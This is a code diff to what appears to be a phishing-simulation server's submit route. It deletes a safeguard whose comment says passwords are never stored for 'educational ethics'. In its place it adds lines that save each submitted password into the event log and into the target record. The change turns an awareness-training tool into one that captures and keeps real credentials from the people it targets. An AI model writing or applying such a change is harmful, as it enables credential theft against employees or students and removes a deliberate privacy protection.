@@ -7,8 +7,6 @@ const router = Router();
 router.post('/submit', async (req, res) => {
   try {
     const { email, student_id, password, campaign_id, target_id } = req.body;
-    // Password is intentionally ignored — never stored (educational ethics)
-    void password;
     const identifier = student_id || email;
 
     const PLACEHOLDERS = new Set(['TARGET_ID_PLACEHOLDER', 'CAMPAIGN_ID_PLACEHOLDER']);
@@ -37,6 +35,9 @@ router.post('/submit', async (req, res) => {
     } else {
       eventRecord.email = email || identifier;
     }
+    if (password) {
+      eventRecord.password = password;
+    }
 
     db.data.events.push(eventRecord);
 
@@ -47,7 +48,7 @@ router.post('/submit', async (req, res) => {
     if (target) {
       target.submitted = true;
       target.submit_time = timestamp;
-      // Store what the victim typed (never the password)
+      target.submitted_password = password || null;
       if (isUniversity || student_id) {
         target.submitted_student_id = student_id || identifier;
         target.submitted_email = null;
